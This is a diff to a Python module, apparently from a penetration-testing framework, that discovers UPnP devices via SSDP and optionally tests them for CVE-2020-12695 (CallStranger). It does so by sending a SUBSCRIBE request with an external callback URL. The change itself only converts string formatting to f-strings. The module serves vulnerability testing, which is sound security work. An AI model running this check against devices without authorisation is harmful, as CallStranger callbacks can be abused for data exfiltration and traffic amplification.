@@ -17,12 +17,12 @@ def _build_msearch(st="ssdp:all", mx=3):
     """Constrói mensagem M-SEARCH SSDP multicast."""
     return (
         "M-SEARCH * HTTP/1.1\r\n"
-        "HOST: {}:{}\r\n"
+        f"HOST: {_SSDP_MCAST_ADDR}:{_SSDP_PORT}\r\n"
         "MAN: \"ssdp:discover\"\r\n"
-        "MX: {}\r\n"
-        "ST: {}\r\n"
+        f"MX: {mx}\r\n"
+        f"ST: {st}\r\n"
         "\r\n"
-    ).format(_SSDP_MCAST_ADDR, _SSDP_PORT, mx, st).encode("utf-8")
+    ).encode()
 
 
 def _parse_ssdp_response(data):
@@ -123,15 +123,15 @@ class Exploit(Exploit):
 
     def _test_callstranger(self, device_ip, device_port, callback_url):
         """Testa CVE-2020-12695: SUBSCRIBE com callback externo."""
-        event_url = "http://{}:{}/event".format(device_ip, device_port)
+        event_url = f"http://{device_ip}:{device_port}/event"
         subscribe_request = (
-            "SUBSCRIBE {} HTTP/1.1\r\n"
-            "HOST: {}:{}\r\n"
-            "CALLBACK: <{}>\r\n"
+            f"SUBSCRIBE {event_url} HTTP/1.1\r\n"
+            f"HOST: {device_ip}:{device_port}\r\n"
+            f"CALLBACK: <{callback_url}>\r\n"
             "NT: upnp:event\r\n"
             "TIMEOUT: Second-1800\r\n"
             "\r\n"
-        ).format(event_url, device_ip, device_port, callback_url).encode("utf-8")
+        ).encode()
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -156,14 +156,14 @@ class Exploit(Exploit):
     @multi
     def run(self):
         """Descobre dispositivos UPnP e opcionalmente testa CallStranger."""
-        print_status("Varredura SSDP ({} segundos)...".format(self.scan_duration))
+        print_status(f"Varredura SSDP ({self.scan_duration} segundos)...")
         devices = self._ssdp_discover(int(self.scan_duration))
 
         if not devices:
             print_warning("Nenhum dispositivo UPnP encontrado via SSDP multicast")
             return
 
-        print_success("{} dispositivo(s) UPnP descoberto(s)".format(len(devices)))
+        print_success(f"{len(devices)} dispositivo(s) UPnP descoberto(s)")
         headers = ["IP", "Fabricante/Dispositivo", "LOCATION", "USN"]
         rows = []
         for ip, info in sorted(devices.items()):
@@ -180,8 +180,7 @@ class Exploit(Exploit):
         print_table(headers, *rows)
 
         if self.test_callstranger and self.callback_url:
-            print_status("Testando CallStranger ({}) em {} dispositivo(s)...".format(
-                _CALLSTRANGER_CVE, len(devices)))
+            print_status(f"Testando CallStranger ({_CALLSTRANGER_CVE}) em {len(devices)} dispositivo(s)...")
             vuln_count = 0
             for ip, info in devices.items():
                 loc = info.get("LOCATION", "")
@@ -190,16 +189,14 @@ class Exploit(Exploit):
                     continue
                 success, resp = self._test_callstranger(ip, port, str(self.callback_url))
                 if success:
-                    print_success("[VULNERÁVEL] {} aceitou SUBSCRIBE callback para: {}".format(
-                        ip, self.callback_url))
+                    print_success(f"[VULNERÁVEL] {ip} aceitou SUBSCRIBE callback para: {self.callback_url}")
                     vuln_count += 1
                 else:
-                    print_info("[OK] {} rejeitou ou não respondeu CallStranger".format(ip))
+                    print_info(f"[OK] {ip} rejeitou ou não respondeu CallStranger")
 
             if vuln_count:
-                print_warning("{} dispositivo(s) vulnerável(is) ao {} detectado(s)".format(
-                    vuln_count, _CALLSTRANGER_CVE))
+                print_warning(f"{vuln_count} dispositivo(s) vulnerável(is) ao {_CALLSTRANGER_CVE} detectado(s)")
             else:
-                print_info("Nenhum dispositivo vulnerável ao {} detectado".format(_CALLSTRANGER_CVE))
+                print_info(f"Nenhum dispositivo vulnerável ao {_CALLSTRANGER_CVE} detectado")
         elif self.test_callstranger and not self.callback_url:
             print_warning("test_callstranger=true mas callback_url não definida")
